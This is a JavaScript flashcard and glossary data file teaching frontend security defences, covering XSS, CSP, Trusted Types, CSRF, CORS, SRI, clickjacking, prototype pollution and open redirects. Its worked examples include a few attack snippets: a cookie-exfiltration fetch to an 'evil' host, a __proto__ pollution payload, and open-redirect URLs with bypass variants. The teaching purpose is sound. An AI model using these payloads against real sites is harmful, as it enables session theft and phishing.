/* Frontend Security (FE-SEC) — fact-checked content wave (auto-assembled) */
CARDS_DATA.push(
  {"sec":"FE-SEC","front":"What are the three classes of XSS, and how do they differ in where the untrusted data flows?","back":"<strong>XSS</strong> injects attacker-controlled markup/script into a page so it runs in the victim's origin. Three classes:<ul><li><strong>Stored (persistent)</strong>: payload is saved server-side (DB, comment, profile) and served to every viewer — highest blast radius.</li><li><strong>Reflected</strong>: payload rides in the request (query param, form) and is echoed straight back into the response — needs a crafted link/lure.</li><li><strong>DOM-based</strong>: the injection never touches the server response markup; <em>client-side JS</em> reads an untrusted <strong>source</strong> (<code>location.hash</code>, <code>document.referrer</code>) and writes it to a dangerous <strong>sink</strong> (<code>innerHTML</code>, <code>eval</code>, <code>document.write</code>). Server-side templating defenses don't help here — the bug is entirely in the browser.</li></ul>The fix is the same root principle: <em>context-aware output encoding / sanitization at the sink</em>, not input filtering."},
  {"sec":"FE-SEC","front":"Why is input validation a poor primary XSS defense, and what is?","back":"<strong>Input filtering is the wrong layer.</strong> The same string is safe or dangerous depending on the <em>output context</em> it lands in — HTML body, attribute, URL, JS string, or CSS — so a blocklist applied at input can't know the destination and is trivially bypassed (encoding tricks, mixed contexts). The correct defense is <strong>context-aware output encoding</strong> applied at the moment of rendering:<ul><li>HTML body → HTML-entity encode (<code>&lt; &gt; &amp;</code>)</li><li>Attribute → attribute encode + quote</li><li>URL → <code>encodeURIComponent</code>, and validate the scheme (block <code>javascript:</code>)</li><li>JS context → JS string encode (or better, pass via <code>JSON.parse</code>/data attributes, never string concatenation)</li></ul>Modern frameworks (React, Vue, Angular) auto-encode by default in the HTML-text context — which is why XSS in them almost always comes from an <em>escape hatch</em> (<code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>bypassSecurityTrustHtml</code>) or a non-HTML sink (<code>href</code>, <code>srcdoc</code>). Input validation is still worthwhile as defense-in-depth (and for non-security correctness) — just not as the <em>primary</em> XSS control."},
  {"sec":"FE-SEC","front":"<code>dangerouslySetInnerHTML</code> — when do you actually need it, and how do you make it safe?","back":"React escapes all interpolated children by default, so <code>{userInput}</code> renders as inert text. <code>dangerouslySetInnerHTML={{__html: html}}</code> is the deliberate opt-out for cases where you must inject real markup (rendered Markdown, a CMS rich-text field, sanitized email HTML). It is named <em>dangerously</em> on purpose: React does <strong>zero</strong> sanitization of that string.<ul><li><strong>Rule</strong>: never pass raw user/3rd-party HTML — first run it through <code>DOMPurify.sanitize(html)</code>.</li><li>Sanitize as close to render as possible; don't store \"sanitized\" HTML and trust it later (config drift, and your allowlist may change).</li><li>Even better, layer <strong>Trusted Types</strong> so the browser enforces that only a vetted policy can produce the <code>TrustedHTML</code> reaching this sink.</li></ul>Same idea for Vue's <code>v-html</code> and Angular's <code>[innerHTML]</code> (Angular auto-sanitizes <code>[innerHTML]</code> with its built-in sanitizer, but <code>bypassSecurityTrustHtml</code> disables it — and Angular's sanitizer is not as configurable as DOMPurify)."},
  {"sec":"FE-SEC","front":"What is DOMPurify and what is the one rule that defeats most bypasses of it?","back":"<strong>DOMPurify</strong> is a battle-tested, allowlist-based HTML sanitizer: it parses untrusted HTML into a DOM, strips disallowed tags/attributes/URLs (e.g. <code>&lt;script&gt;</code>, <code>onerror=</code>, <code>javascript:</code>), and returns clean markup. It runs in the browser (and via jsdom on the server).<ul><li><strong>Critical rule — sanitize last, don't mutate after</strong>: any DOM manipulation or re-serialization <em>after</em> sanitization can reintroduce XSS via <strong>mutation XSS (mXSS)</strong>, where the browser's own re-parsing of the string turns benign-looking markup into an executable form. Sanitize, then insert the result directly, then leave it alone.</li><li>Configure the allowlist tightly (<code>ALLOWED_TAGS</code>, <code>ALLOWED_ATTR</code>); the bigger the allowlist, the bigger the attack surface.</li><li>Keep it <em>updated</em> — mXSS and namespace-confusion bypasses are found and patched regularly. A pinned-and-forgotten DOMPurify is a liability.</li></ul>DOMPurify is the sanitization tool; <strong>Trusted Types</strong> is the enforcement mechanism that guarantees you actually called it before a sink."},
  {"sec":"FE-SEC","front":"What problem do Trusted Types solve that CSP and DOMPurify alone don't, and where is it supported?","back":"<strong>Trusted Types</strong> (the CSP directive <code>require-trusted-types-for 'script'</code>) makes the browser <em>refuse</em> to assign a plain string to a dangerous DOM sink — <code>innerHTML</code>, <code>script.src</code>, <code>eval</code>, <code>document.write</code> — unless the value is a typed <code>TrustedHTML</code>/<code>TrustedScript</code> produced by a registered policy.<ul><li>It flips the model from <em>\"hope every dev remembered to sanitize\"</em> to <em>\"the platform enforces a single chokepoint.\"</em></li><li>You define one (or few) policies (<code>trustedTypes.createPolicy('default', {createHTML: s =&gt; DOMPurify.sanitize(s)})</code>); every sink assignment must flow through a policy or throw a <code>TypeError</code>. A policy literally named <code>default</code> is auto-invoked for stray string assignments.</li><li>It collapses thousands of potential DOM-XSS sinks into a tiny, auditable set of policy functions — turning a code-review problem into a config-enforced invariant.</li></ul><strong>Support (2026)</strong>: Chrome/Edge since v83 (2020), Safari 26 (Sep 2025), Firefox (Feb 2026) — it reached <strong>Baseline</strong> in early 2026, so it is no longer Chromium-only. It still degrades safely (ignored) on older engines, so pair it with sanitization. CSP <code>script-src</code> blocks <em>loading</em> scripts; Trusted Types blocks <em>creating</em> them from strings."},
  {"sec":"FE-SEC","front":"Explain CSP <code>script-src</code> and why <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code> defeat the point.","back":"<strong>Content Security Policy</strong> is a defense-in-depth allowlist of what resources may load/execute, sent via the <code>Content-Security-Policy</code> response header. <code>script-src</code> controls JS execution.<ul><li><code>'unsafe-inline'</code> permits <em>any</em> inline <code>&lt;script&gt;</code> and inline event handlers — exactly the vector XSS uses — so it nullifies CSP's XSS value.</li><li><code>'unsafe-eval'</code> permits <code>eval</code>/<code>new Function</code>/string <code>setTimeout</code>, reopening string-to-code execution.</li></ul>The modern, robust pattern is a <strong>nonce- or hash-based, strict CSP</strong>:<br><code>script-src 'nonce-RANDOM' 'strict-dynamic'; object-src 'none'; base-uri 'none'</code><ul><li><strong>nonce</strong>: a fresh, cryptographically random per-response token on each legit <code>&lt;script nonce=...&gt;</code>; injected scripts lack it.</li><li><strong>'strict-dynamic'</strong>: lets already-trusted (nonce'd/hashed) scripts load further scripts, and <em>causes the browser to ignore host-source allowlists and <code>'self'</code></em> in supporting browsers — so you don't rely on CDN host allowlists (notoriously bypassable via JSONP/AngularJS gadgets). Keep <code>'self'</code>/host fallbacks present only for engines that don't support <code>'strict-dynamic'</code>.</li></ul>CSP is a <em>second line</em> — it limits the damage of an XSS bug, it doesn't replace output encoding."},
  {"sec":"FE-SEC","front":"What is CSRF, and exactly which mechanisms stop it?","back":"<strong>CSRF</strong> (Cross-Site Request Forgery) abuses the browser's habit of <em>auto-attaching cookies</em>: a malicious site triggers a state-changing request (<code>POST /transfer</code>) to a site where the victim is logged in, and the cookie rides along — the server can't tell it wasn't user-intended. It targets <em>actions</em>, not data theft. Defenses:<ul><li><strong>SameSite cookies</strong>: <code>SameSite=Lax</code> blocks cookies on cross-site subrequests and cross-site POSTs; <code>Strict</code> is tighter. Note this is the <em>Chromium</em> default for cookies set without an explicit attribute (Chrome/Edge/Opera) — <strong>Firefox and Safari do not default to Lax</strong>, so set it explicitly rather than relying on a browser default.</li><li><strong>Anti-CSRF token</strong>: a server-generated unguessable token echoed in the form/header (synchronizer or double-submit pattern). The cross-site attacker can't read it (same-origin policy blocks reading your responses), so they can't forge it.</li><li><strong>Origin/Referer check</strong> on state-changing endpoints (or <code>Sec-Fetch-Site</code>).</li></ul><em>Gotchas</em>: SameSite isn't sufficient alone — <code>Lax</code> still allows top-level GET navigations (so never make GETs state-changing), and Chromium's Lax-by-default has a 2-minute window where fresh cookies still ride cross-site top-level POSTs. Same-site sibling subdomains can be a weak link. CORS does <strong>not</strong> stop CSRF (the forged request is fire-and-forget; the attacker doesn't need to read the response)."},
  {"sec":"FE-SEC","front":"Why is CORS a relaxation of the same-origin policy, not a security mechanism?","back":"The <strong>Same-Origin Policy (SOP)</strong> is the browser's core isolation: scripts from origin A can't <em>read</em> responses from origin B (origin = scheme + host + port). <strong>CORS</strong> is the server's way to <em>selectively loosen</em> that, via <code>Access-Control-Allow-Origin</code> and friends.<ul><li>CORS <em>grants</em> read access; it never restricts anything the browser wouldn't already allow.</li><li>A permissive <code>Access-Control-Allow-Origin: *</code> (or reflecting any Origin) plus <code>Access-Control-Allow-Credentials: true</code> is a real vulnerability — it lets arbitrary sites read authenticated responses. The spec <em>forbids</em> <code>*</code> together with credentials (the browser rejects it), so the dangerous real-world mistake is <strong>reflecting the request's Origin</strong> into the header while allowing credentials.</li><li>CORS does <strong>not</strong> prevent CSRF: simple / preflight-exempt requests still <em>reach</em> the server and execute side effects; CORS only governs whether JS may read the <em>response</em>.</li></ul>Mental model: SOP is the wall; CORS is a controlled door you open. Misconfigured doors are how data leaks."},
  {"sec":"FE-SEC","front":"localStorage vs HttpOnly cookie for auth tokens — what's the real tradeoff?","back":"It's an <strong>XSS-vs-CSRF</strong> tradeoff, and XSS usually wins the argument:<ul><li><strong>localStorage / JS-readable token</strong>: any XSS (even in a third-party dependency) can read the token with one line and exfiltrate it — full account takeover, persistent. No CSRF risk because JS must explicitly attach it.</li><li><strong>HttpOnly + Secure + SameSite cookie</strong>: JS <em>cannot</em> read it, so XSS can't steal the token directly (it can still ride the session by making same-origin requests while the page is open, but can't exfiltrate a long-lived credential). Cost: cookies auto-send → you must add CSRF protection (SameSite + token).</li></ul><strong>Senior answer</strong>: prefer <code>HttpOnly; Secure; SameSite=Lax/Strict</code> cookies + CSRF tokens. Don't put long-lived refresh tokens in localStorage. If you must use bearer tokens in JS (e.g. cross-domain SPA), keep them short-lived in memory, refresh via an HttpOnly cookie, and treat any XSS as game-over. \"localStorage avoids CSRF\" is true but trades a smaller, well-mitigated risk for a larger one."},
  {"sec":"FE-SEC","front":"What is Subresource Integrity (SRI), and how do you actually enforce it in 2026?","back":"<strong>SRI</strong> pins a cryptographic hash to an external <code>&lt;script&gt;</code>/<code>&lt;link&gt;</code> so the browser refuses to execute it if the fetched bytes don't match:<br><code>&lt;script src=\"https://cdn/x.js\" integrity=\"sha384-...\" crossorigin=\"anonymous\"&gt;</code><ul><li>It defends against a <strong>compromised/swapped CDN asset</strong> — if the CDN is hacked and serves malicious JS, the hash mismatch blocks it.</li><li>Requires <code>crossorigin</code> for cross-origin fetches (CORS) and a stable, versioned URL — it's useless against assets that legitimately change (it'll just break them).</li><li><strong>Enforcing that integrity is present</strong>: the old CSP <code>require-sri-for</code> directive is obsolete/removed. The modern mechanism is the <code>Integrity-Policy</code> response header (with <code>Integrity-Policy-Report-Only</code> for a monitoring rollout), which makes the browser block scripts/styles lacking integrity metadata.</li></ul><strong>Blind spot</strong>: SRI only verifies the exact bytes you pinned. It does <em>nothing</em> against a <strong>compromised package at build time</strong> (you'd hash the already-malicious bundle) or a script that loads further code at runtime. It's one layer of supply-chain defense — pair with lockfiles, dependency pinning, and CSP."},
  {"sec":"FE-SEC","front":"How does clickjacking work, and what's the correct 2026 defense?","back":"<strong>Clickjacking</strong> frames your site in a transparent/overlaid iframe on an attacker page and tricks the user into clicking <em>your</em> UI (a \"Confirm transfer\" button) while thinking they're clicking the attacker's page — UI redress. Defenses:<ul><li><strong>CSP <code>frame-ancestors</code></strong> — the modern, preferred control: <code>frame-ancestors 'none'</code> (or <code>'self'</code> / specific origins) tells the browser who may embed you. It supersedes <code>X-Frame-Options</code>, supports multiple origins, and is the recommendation today.</li><li><strong><code>X-Frame-Options: DENY/SAMEORIGIN</code></strong> — the legacy header; still set it for very old clients, but <code>frame-ancestors</code> is authoritative (and where both are present, browsers honor <code>frame-ancestors</code>).</li></ul><em>Gotchas</em>: <code>X-Frame-Options</code> doesn't support an allowlist of multiple origins (one reason it was superseded); JS \"frame-busting\" scripts are bypassable (a <code>sandbox</code>ed iframe without <code>allow-top-navigation</code> neuters them) and are <strong>not</strong> a real defense. Set the header at the server/edge — a <code>&lt;meta&gt;</code> tag does <em>not</em> work for these framing controls."},
  {"sec":"FE-SEC","front":"What is prototype pollution and why is it a frontend (not just Node) problem?","back":"<strong>Prototype pollution</strong> exploits JS's prototype chain: if code recursively merges/clones attacker-controlled keys without guarding, a payload like <code>{\"__proto__\": {\"isAdmin\": true}}</code> writes onto <code>Object.prototype</code>, so <em>every</em> plain object in the runtime inherits the polluted property.<ul><li>Vectors: unsafe deep-merge/<code>set</code>/<code>extend</code> utilities, query-string parsers, and JSON merged into config — historically the source of many lodash/jQuery-plugin CVEs.</li><li>Frontend impact: a polluted property can flip security flags, and crucially it can become a <strong>gadget</strong> that escalates to <strong>DOM XSS</strong> — e.g. a sanitizer or template that reads a config option (like an allowed-tags flag) off the prototype now sees attacker data.</li></ul><strong>Defenses</strong>: reject/strip <code>__proto__</code>, <code>constructor</code>, <code>prototype</code> keys; use <code>Object.create(null)</code> or <code>Map</code> for untrusted key/value stores; <code>Object.freeze(Object.prototype)</code> as a hardening backstop; keep merge libraries patched. Don't deep-merge untrusted JSON into objects."},
  {"sec":"FE-SEC","front":"What is an open redirect, and why does it matter for a frontend engineer?","back":"<strong>Open redirect</strong>: an endpoint takes a destination from user input and redirects to it without validation — <code>/login?returnUrl=https://evil.com</code>. The danger is <em>trust transfer</em>: the link starts on your legit domain, so users and email filters trust it, then it bounces to a phishing/credential-harvest page. It also enables <strong>OAuth token/code theft</strong> when a redirect-back URL is attacker-controllable, and can chain into <code>javascript:</code>-based XSS if the redirect value reaches a navigation sink.<ul><li><strong>Fix</strong>: never redirect to a raw user-supplied URL. Allowlist exact paths, or accept only <em>relative</em> paths and reject anything with a scheme/host (watch for bypasses: <code>//evil.com</code>, <code>https:/\\evil.com</code>, backslashes, whitespace, control chars, unicode/IDN tricks).</li><li>For OAuth/SSO, validate <code>redirect_uri</code> against a strict registered allowlist — exact match, no wildcards.</li></ul>It's frequently dismissed as low severity but is a reliable phishing primitive and a common OAuth-flow break."},
  {"sec":"FE-SEC","front":"What does an iframe <code>sandbox</code> attribute do, and what's the dangerous combination?","back":"<code>sandbox</code> drops an iframe into a restricted context that disables scripts, forms, popups, top-level navigation, same-origin treatment, and more — you then <em>re-grant</em> capabilities token by token: <code>sandbox=\"allow-scripts allow-forms\"</code>. It's how you safely embed untrusted/3rd-party content (ads, user HTML, embeds).<ul><li><strong>The footgun</strong>: granting <code>allow-scripts allow-same-origin</code> together to content from <em>your own</em> origin lets the framed page run script <em>and</em> be treated as same-origin — so it can reach into the parent's DOM, <strong>remove its own iframe's <code>sandbox</code> attribute</strong>, and reload to fully escape. Per the HTML spec this is equivalent to no sandbox at all. Never grant both together for same-origin content.</li><li>Empty <code>sandbox=\"\"</code> = maximum restriction (unique opaque origin, no script).</li><li>Pair with <code>srcdoc</code> for inline untrusted HTML and with <code>allow</code> (Permissions Policy) / <code>referrerpolicy</code> for feature and referrer control.</li></ul>Sandbox isolates embedded content; it's the iframe analog of least-privilege."},
  {"sec":"FE-SEC","front":"Name the high-value security response headers a senior frontend should ship by default.","back":"<ul><li><strong><code>Content-Security-Policy</code></strong> — strict nonce/hash <code>script-src</code> with <code>'strict-dynamic'</code>, plus <code>object-src 'none'</code>, <code>base-uri 'none'</code>, <code>frame-ancestors</code>. Your XSS/clickjacking defense-in-depth.</li><li><strong><code>Strict-Transport-Security</code> (HSTS)</strong> — <code>max-age=31536000; includeSubDomains; preload</code>. Forces HTTPS, defeats SSL-strip downgrade and cookie-leak-over-HTTP. Only honored over HTTPS; <code>preload</code> is hard to undo, so commit deliberately.</li><li><strong><code>X-Content-Type-Options: nosniff</code></strong> — stops MIME sniffing, so the browser won't reinterpret a JSON/text response as executable HTML/JS (a classic XSS via content-type confusion).</li><li><strong><code>Referrer-Policy</code></strong> — e.g. <code>strict-origin-when-cross-origin</code> to avoid leaking full URLs (tokens in paths) to third parties.</li><li><strong><code>Permissions-Policy</code></strong> — disable unused powerful features (camera, geolocation, etc.).</li></ul>Set these as real HTTP headers at the edge/server (a <code>&lt;meta&gt;</code> tag doesn't work for HSTS, framing, or nosniff). <code>X-Frame-Options</code> is legacy — superseded by <code>frame-ancestors</code> but still set it for old clients. <code>X-XSS-Protection</code> is deprecated (the XSS Auditor was removed from Chrome in v78, 2019) — omit it or set <code>0</code>."},
  {"sec":"FE-SEC","front":"Why must secrets never reach the client bundle, and what's the subtle version of this mistake?","back":"<strong>Anything shipped to the browser is public.</strong> JS bundles, source maps, env vars inlined at build time, and network payloads are all readable by any user via DevTools. So API keys with server privileges, signing secrets, DB creds, and private tokens must <em>never</em> be in client code — minification and obfuscation are not protection.<ul><li><strong>Subtle trap — build-time env inlining</strong>: bundlers replace <code>process.env.X</code> / <code>import.meta.env.VITE_X</code> literally into the bundle. Vite only exposes <code>VITE_</code>-prefixed vars and Next.js only <code>NEXT_PUBLIC_</code>-prefixed ones to the client <em>by design</em> — but devs routinely prefix a real secret to \"make it work,\" leaking it.</li><li><strong>React Server Components / Next.js</strong>: server-only code and secrets stay on the server, but a stray <code>'use client'</code> boundary or passing a secret as a prop to a client component serializes it into the RSC payload. Audit the server/client boundary; consider <code>server-only</code> import guards.</li></ul>Correct pattern: secrets live server-side; the client calls <em>your</em> backend (a BFF/proxy) which holds the credential and scopes the operation. Public, origin/referrer-restricted keys (e.g. Maps) are the only kind safe to expose."},
  {"sec":"FE-SEC","front":"What is the modern frontend supply-chain risk model, and how do you reduce it?","back":"Your app's real attack surface includes <em>every transitive dependency and every third-party script</em> the page loads at runtime. Threats:<ul><li><strong>Malicious/compromised npm package</strong> (typosquat, hijacked maintainer, post-install script) — runs with your build's privileges; can exfiltrate env/secrets or inject into the bundle.</li><li><strong>Compromised third-party script/CDN tag</strong> (analytics, tag managers) — runs in your origin with full DOM/cookie access; this is the <em>Magecart</em> skimming pattern.</li></ul><strong>Reductions</strong>:<ul><li>Commit lockfiles; pin versions; use <code>npm ci</code> (installs from the lockfile with integrity hashes); review dependency diffs on upgrade.</li><li>Disable install scripts where feasible (<code>--ignore-scripts</code>), audit with SCA tooling, watch for typosquats.</li><li><strong>SRI</strong> on CDN assets (enforced via the <code>Integrity-Policy</code> header); <strong>strict CSP</strong> with <code>connect-src</code> to constrain where scripts can exfiltrate and <code>script-src</code>/<code>frame-ancestors</code> to constrain execution/embedding; sandbox risky embeds.</li><li>Generate an <strong>SBOM</strong>; minimize dependency count — fewer deps, smaller surface.</li></ul>You cannot fully trust the registry; assume any dependency can turn hostile and contain the blast radius with CSP + least privilege."}
);

Object.assign(GLOSSARY_DATA, {
  "csp": {"term":"Content Security Policy (CSP)","group":"FE-SEC","eli5":"A response header that tells the browser exactly which scripts and resources are allowed to run, so injected ones don't.","memory":"\"Allowlist for execution.\" Nonce + strict-dynamic = good; unsafe-inline/unsafe-eval = you turned it off.","full":"<p><strong>CSP</strong> is a defense-in-depth HTTP header (<code>Content-Security-Policy</code>) that constrains which resources may load and execute. Its highest-value directive is <code>script-src</code>; supporting directives include <code>object-src 'none'</code>, <code>base-uri 'none'</code>, <code>frame-ancestors</code> (clickjacking), and <code>connect-src</code> (where the page may call out).</p><p>The robust modern form is a <strong>strict, nonce- or hash-based</strong> policy with <code>'strict-dynamic'</code>, which makes supporting browsers ignore fragile host allowlists. CSP <em>limits the damage</em> of an XSS bug — it is a second line of defense, never a replacement for output encoding. <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code> re-enable the exact vectors XSS uses and should be avoided.</p>","trap":"Believing CSP 'prevents XSS.' It mitigates/contains XSS. A policy with 'unsafe-inline' provides essentially no XSS protection.","worked":"<code>Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'</code> — only the script tag carrying nonce=r4nd0m runs; an injected inline script can't guess the per-response nonce.","related":["xss","trusted-types","clickjacking","sri"]},
  "same-origin-policy": {"term":"Same-Origin Policy (SOP)","group":"FE-SEC","eli5":"By default, a page can't read data from a different site's origin — that wall is what keeps one tab from spying on another.","memory":"\"Scheme + host + port must all match to read.\" SOP is the wall; CORS is a door.","full":"<p>The <strong>Same-Origin Policy</strong> is the browser's foundational isolation boundary: script from origin A cannot <em>read</em> responses, cookies, or DOM belonging to origin B, where origin = <code>scheme + host + port</code>. It's why <code>https://app.com</code> and <code>https://api.app.com</code> (different host) or <code>http</code> vs <code>https</code> (different scheme) are distinct origins.</p><p>SOP governs reads, not all sends — which is why CSRF (a write) is possible despite SOP, and why CORS exists to <em>selectively relax</em> read restrictions. Understanding SOP is the key to reasoning about CORS, CSRF, postMessage, and iframe isolation correctly.</p>","trap":"Confusing 'site' with 'origin.' SameSite cookies use eTLD+1 (site), but SOP uses the stricter scheme+host+port (origin). They are not the same boundary.","worked":"<code>fetch('https://api.other.com/me')</code> from <code>https://app.com</code> sends the request, but JS can't read the response body unless <code>api.other.com</code> returns a matching <code>Access-Control-Allow-Origin</code>.","related":["cors","csrf","iframe-sandbox","csp"]},
  "cors": {"term":"Cross-Origin Resource Sharing (CORS)","group":"FE-SEC","eli5":"A server's way of saying 'these specific other sites are allowed to read my responses' — it loosens the same-origin wall, it doesn't add security.","memory":"\"CORS opens doors, it never locks them.\" Reflecting Origin + credentials = leak.","full":"<p><strong>CORS</strong> is a controlled relaxation of the Same-Origin Policy via response headers (<code>Access-Control-Allow-Origin</code>, <code>-Allow-Credentials</code>, <code>-Allow-Methods</code>, plus a preflight <code>OPTIONS</code> for non-simple requests). It grants cross-origin <em>read</em> access the SOP would otherwise deny.</p><p>It is purely permissive — it cannot restrict anything. The dangerous misconfiguration is <strong>reflecting the request Origin</strong> into <code>Allow-Origin</code> together with <code>Allow-Credentials: true</code>, which lets arbitrary sites read authenticated responses (the spec forbids literal <code>*</code> with credentials, so attackers rely on reflection). CORS also does not defend against CSRF.</p>","trap":"Treating CORS as a security control. It's the opposite — a deliberate loosening. A 'CORS error' in the console means the browser PROTECTED you, not that CORS failed.","worked":"Vulnerable: server echoes <code>Access-Control-Allow-Origin: https://evil.com</code> + <code>Access-Control-Allow-Credentials: true</code> → evil.com's JS reads the victim's authenticated <code>/account</code> JSON.","related":["same-origin-policy","csrf","security-headers"]},
  "dom-purify": {"term":"DOMPurify / HTML Sanitization","group":"FE-SEC","eli5":"A library that scrubs untrusted HTML, removing scripts and dangerous attributes before you insert it into the page.","memory":"\"Sanitize last, then don't touch it.\" Any DOM edit/re-parse after sanitizing can resurrect XSS (mXSS).","full":"<p><strong>DOMPurify</strong> is the de-facto allowlist-based HTML sanitizer. It parses untrusted markup into a DOM, strips disallowed tags, attributes, and URL schemes (e.g. <code>script</code>, <code>onerror</code>, <code>javascript:</code>), and returns clean HTML safe to inject. Use it whenever you must render real markup from users or third parties (Markdown output, CMS rich text).</p><p>The critical operational rule is to sanitize <em>at the last moment</em> and not mutate or re-serialize the result, because re-parsing can trigger <strong>mutation XSS (mXSS)</strong>. Configure the allowlist as tightly as the feature allows, and keep the library updated — bypasses are found and patched regularly.</p>","trap":"Writing your own regex/blocklist 'sanitizer.' HTML is too irregular to regex safely; you will be bypassed. Use a parser-based allowlist sanitizer.","worked":"<code>el.innerHTML = DOMPurify.sanitize(userMarkdownHtml, {ALLOWED_TAGS:['b','i','a','p'], ALLOWED_ATTR:['href']})</code> strips an injected <code>&lt;img onerror=...&gt;</code> while keeping formatting.","related":["xss","trusted-types","dangerously-set-inner-html","prototype-pollution"]},
  "trusted-types": {"term":"Trusted Types","group":"FE-SEC","eli5":"A browser feature that refuses to let plain strings reach dangerous DOM functions unless they passed through your one approved cleaning policy.","memory":"\"No typed object, no innerHTML.\" Turns 'did everyone sanitize?' into an enforced chokepoint.","full":"<p><strong>Trusted Types</strong> is enabled by the CSP directive <code>require-trusted-types-for 'script'</code>. Once on, assigning a raw string to a dangerous sink (<code>innerHTML</code>, <code>script.src</code>, <code>eval</code>, <code>document.write</code>) throws unless the value is a <code>TrustedHTML</code>/<code>TrustedScript</code> produced by a registered policy (a policy named <code>default</code> is auto-applied to stray string assignments).</p><p>This collapses thousands of potential DOM-XSS sinks into a handful of auditable policy functions, converting a fragile code-review habit into a platform-enforced invariant. As of early 2026 it is <strong>Baseline</strong> — Chrome/Edge (2020), Safari 26 (2025), and Firefox (2026) — and it degrades gracefully where unsupported, so it complements rather than replaces sanitization.</p>","trap":"Assuming Trusted Types sanitizes for you. It only enforces that values came from a policy; YOUR policy must call DOMPurify (or equivalent) to actually clean.","worked":"<code>const p = trustedTypes.createPolicy('default', {createHTML: s =&gt; DOMPurify.sanitize(s)}); el.innerHTML = p.createHTML(dirty);</code> — direct <code>el.innerHTML = dirty</code> now throws a TypeError.","related":["xss","dom-purify","csp","dangerously-set-inner-html"]},
  "token-storage": {"term":"Auth Token Storage (Cookie vs localStorage)","group":"FE-SEC","eli5":"Where you keep the login token decides whether your bigger risk is script-theft (localStorage) or forged requests (cookies).","memory":"\"HttpOnly hides it from XSS; cookies need CSRF defense.\" XSS-theft is worse than CSRF.","full":"<p>Storing auth tokens is an <strong>XSS-vs-CSRF</strong> tradeoff. A JS-readable token in <code>localStorage</code> is exfiltrable by any XSS (including in a dependency) for full, persistent account takeover, but carries no CSRF risk. An <strong>HttpOnly + Secure + SameSite cookie</strong> is invisible to JS — XSS can't steal it — but auto-sends, so it requires CSRF protection.</p><p>The senior recommendation is HttpOnly cookies plus CSRF tokens, with short-lived in-memory access tokens refreshed via the cookie if a bearer scheme is required. Long-lived refresh tokens should never sit in localStorage.</p>","trap":"'localStorage is fine because it avoids CSRF.' It trades a smaller, well-mitigated risk (CSRF) for a larger one (any XSS = credential theft). Wrong trade.","worked":"Set-Cookie: <code>session=…; HttpOnly; Secure; SameSite=Lax</code> → an XSS payload running <code>fetch('//evil/'+document.cookie)</code> sees nothing, because the cookie isn't in <code>document.cookie</code>.","related":["xss","csrf","samesite-cookie","security-headers"]},
  "clickjacking": {"term":"Clickjacking","group":"FE-SEC","eli5":"An attacker invisibly frames your site and tricks the user into clicking your buttons while thinking they're clicking something else.","memory":"\"Invisible iframe, hijacked click.\" frame-ancestors is the real lock; frame-busting JS isn't.","full":"<p><strong>Clickjacking</strong> (UI redress) embeds your site in a transparent or overlaid iframe on an attacker page and lures the victim into interacting with your real UI under false pretenses. The authoritative defense in 2026 is the CSP directive <strong><code>frame-ancestors</code></strong> (<code>'none'</code> / <code>'self'</code> / explicit origins), which supersedes the legacy <code>X-Frame-Options</code> header.</p><p>Set <code>X-Frame-Options: DENY/SAMEORIGIN</code> too for old-browser coverage, but rely on <code>frame-ancestors</code> for multi-origin allowlisting. JS frame-busting is bypassable (e.g. a sandboxed iframe without top-navigation) and must not be your only control.</p>","trap":"Using JavaScript frame-busting as the defense. A sandboxed iframe (scripts disabled, or no allow-top-navigation) neutralizes it; only a server header (frame-ancestors / XFO) is reliable.","worked":"<code>Content-Security-Policy: frame-ancestors 'none'</code> — the browser refuses to render your page inside any iframe, so the overlay attack can't load your UI at all.","related":["csp","iframe-sandbox","security-headers"]},
  "prototype-pollution": {"term":"Prototype Pollution","group":"FE-SEC","eli5":"Tricking JS into writing onto Object.prototype so a fake property leaks into every object in the app.","memory":"\"__proto__ in the payload poisons every object.\" Use Object.create(null) / Map for untrusted data.","full":"<p><strong>Prototype pollution</strong> abuses unsafe recursive merge/clone/set operations: a key like <code>__proto__.isAdmin</code> in attacker-controlled JSON writes onto <code>Object.prototype</code>, so every plain object inherits the injected property. It has driven many lodash/jQuery-plugin and query-parser CVEs.</p><p>Beyond flipping security flags, a polluted property often becomes a <strong>gadget</strong> that escalates to DOM XSS when a template or sanitizer reads a config option off the prototype. Defenses: strip <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> keys, use <code>Object.create(null)</code> or <code>Map</code> for untrusted maps, optionally <code>Object.freeze(Object.prototype)</code>, and keep merge libraries patched.</p>","trap":"Assuming it's only a Node/server bug. In the browser it can corrupt app state and chain into DOM XSS via library gadgets.","worked":"<code>merge({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}')); ({}).polluted // true</code> — now every object reports <code>polluted</code>. Fix: a guarded merge that skips <code>__proto__</code>.","related":["xss","dom-purify","supply-chain"]},
  "sri": {"term":"Subresource Integrity (SRI)","group":"FE-SEC","eli5":"A hash on an external script tag so the browser blocks it if the file's bytes were tampered with.","memory":"\"Pin the hash, block the swap.\" But it can't catch a malicious build you hashed yourself.","full":"<p><strong>SRI</strong> attaches a cryptographic digest to <code>&lt;script&gt;</code>/<code>&lt;link&gt;</code> via <code>integrity=\"sha384-…\"</code> (with <code>crossorigin</code> for cross-origin fetches). The browser computes the hash of the fetched bytes and refuses execution on mismatch, defending against a compromised CDN serving altered assets. To <em>require</em> that integrity metadata is present, use the modern <code>Integrity-Policy</code> header (the old CSP <code>require-sri-for</code> directive is obsolete/removed).</p><p>Its blind spot is scope: SRI only verifies the exact pinned bytes. It does nothing against a package compromised at build time (you'd hash the already-malicious bundle) or code loaded dynamically afterward. It's one layer of supply-chain defense, paired with lockfiles, pinning, and CSP.</p>","trap":"Thinking SRI secures your supply chain. It only verifies one fetched file's integrity; a poisoned dependency baked into your bundle passes SRI fine.","worked":"<code>&lt;script src=\"https://cdn/lib.js\" integrity=\"sha384-…\" crossorigin=\"anonymous\"&gt;</code> — if the CDN is hacked and serves different bytes, the browser blocks execution.","related":["supply-chain","csp","security-headers"]},
